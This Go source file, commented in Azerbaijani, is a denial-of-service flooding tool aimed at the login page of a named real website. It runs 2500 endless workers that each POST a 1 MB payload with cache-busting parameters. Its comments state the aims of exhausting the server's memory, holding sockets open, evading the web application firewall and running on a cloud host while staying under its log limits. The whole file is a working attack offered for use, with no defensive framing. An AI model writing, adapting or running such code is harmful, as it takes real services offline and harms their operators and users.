package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

func main() {
	target := "https://empro.az/#/login"
	// Railway planınızın gücünə görə 2500-3000-ə qədər qaldırın
	workers := 2500 

	fmt.Printf("[!!!] HAKAI-FINAL-BOSS AKTİVDİR: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			NextProtos:         []string{"h2", "http/1.1"},
		},
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 25000,
		// Bağlantıları açıq saxlayaraq serverin socketlərini doldururuq
		DisableKeepAlives: false, 
		IdleConnTimeout:   120 * time.Second,
	}

	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
	var successCount uint64
	var crashCount uint64

	var wg sync.WaitGroup
	// 1 MB Payload - Serverin RAM-ını dərhal bitirmək üçün
	payload := "kill=" + strings.Repeat("K", 1048576) 

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				u := fmt.Sprintf("%s&v=%d&z=%d", target, time.Now().UnixNano(), rand.Int())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Real brauzer başlıqlarını davamlı dəyişərək WAF-ı çaşdırırıq
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				atomic.AddUint64(&successCount, 1)

				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					// Body-ni dərhal qapatmırıq ki, server socket-i buraxmasın
					time.Sleep(10 * time.Millisecond)
					resp.Body.Close()
				} else {
					atomic.AddUint64(&crashCount, 1)
					time.Sleep(5 * time.Millisecond)
				}
			}
		}(i)
	}

	// Səssiz hesabat (Railway log limitinə düşməmək üçün)
	go func() {
		for {
			time.Sleep(5 * time.Second)
			fmt.Printf("[STATS] Göndərilən: %d | Server Çöküşü (Error): %d\n", 
				atomic.LoadUint64(&successCount), atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}
